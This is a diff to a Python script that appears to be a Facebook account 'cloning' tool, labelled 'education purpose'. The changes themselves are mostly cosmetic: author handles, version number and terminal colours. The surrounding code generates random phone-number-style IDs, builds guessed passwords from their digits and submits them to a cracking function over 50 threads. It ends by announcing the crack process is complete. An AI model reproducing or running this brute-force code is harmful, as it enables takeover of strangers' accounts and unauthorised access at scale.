@@ -1,5 +1,5 @@
-# Facebook: Dark Fire 10
-# Github: AB-DF10
+# Facebook: Ax-10
+# Github: AHKHakim
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -74,7 +74,7 @@ logo ="""
 \33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mGithub    \33[1;31m: \33[1;32mAHK Hakim               \33[1;32m║
 \33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mStatus    \33[1;31m: \33[1;32mTRIAL                   \33[1;32m║
 \33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mNetwork   \33[1;31m: \33[1;32m3G, 4G/5G, ON           \33[1;32m║
-\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mVersion   \33[1;31m: \33[1;32m1.0                     \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mVersion   \33[1;31m: \33[1;32m1.1                     \33[1;32m║
 \33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mTools     \33[1;31m: \33[1;32mEDUCATION PERPOSE       \33[1;32m║
 \33[1;32m╚════════════════════════════════════════╝"""
 loop = 0
@@ -157,7 +157,7 @@ def xxr():
     code = input(f' [{xr}■{x}] Choose : ') #random.choice([rk1,rk2,rk3])                       
     os.system('clear')
     print(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;0;96m20000, \033[0;92m50000 ] \n\033[0;93m═════════════════════════════════════════ \n\033[0;96m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;32m EXAMPLE : \033[0;93m10000, \x1b[38;0;96m20000, \033[0;92m50000 ] \n\033[0;93m═════════════════════════════════════════ \n\033[0;96m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -172,15 +172,15 @@ def xxr():
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
-        jalan('\033[1;97m====================================================')
+        jalan('\033[1;34m====================================================')
         ip = requests.get("https://api.ipify.org").text
-        jalan("\033[97;1m[\033[38;5;46m+\033[97;1m] \033[97;1mIP ADDRES \033[38;5;196m: \033[38;5;46m"+ip)
+        jalan("\033[97;1m[\033[38;5;46m+\033[97;1m] \033[31;1mIP ADDRES \033[38;5;196m: \033[38;5;46m"+ip)
         jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
         jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
         jalan(f'\033[0;97m[{xr}^{x}]\033[0;96m USE YOUR MOBILE DATA ')
         jalan(f'\033[0;97m[{xr}^{x}] \x1b[33;0;94mUse Flight Mode For Speed Up')
         jalan(f'\033[0;97m[{xr}^{x}] \033[0;92mSuper Fast Speed Cloning')
-        jalan('\033[1;97m====================================================')
+        jalan('\033[1;34m====================================================')
         for love in user:
             pwx = [love[1:]]
             uid = code+love
@@ -188,7 +188,9 @@ def xxr():
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} ══════════════════════════════════════════")
+    print(f"\33[1;32m\n══════════════════════════════════════════")
+    print('\33[1;32mCRACK PROCESS HAS BEEN COMPLETED ')
+    
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
